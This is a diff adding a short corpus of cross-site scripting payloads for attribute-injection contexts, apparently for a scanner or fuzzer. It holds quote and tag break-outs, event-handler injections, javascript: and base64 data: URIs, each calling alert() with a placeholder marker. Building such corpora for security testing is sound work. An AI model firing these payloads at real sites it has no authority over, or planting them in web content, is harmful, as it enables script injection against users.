@@ -1,0 +1,14 @@
+# XSS payload corpus — attribute-injection context (reflection inside a
+# quoted tag attribute). Quotes and angle brackets must survive raw.
+" onfocus=alert('{c}') autofocus="
+" onmouseover=alert('{c}') "
+' oninput=alert('{c}') '
+" onload=alert('{c}') src="
+" onerror=alert('{c}') src=x "
+"><script>alert('{c}')</script>
+""><script>alert('{c}')</script>
+'-></style><script>alert('{c}')</script>
+ javascript:alert('{c}')
+data:text/html;base64,PHNjcmlwdD5hbGVydCgne2N9Jyk8L3NjcmlwdD4=
+" formaction=javascript:alert('{c}') "
+" background="javascript:alert('{c}')"
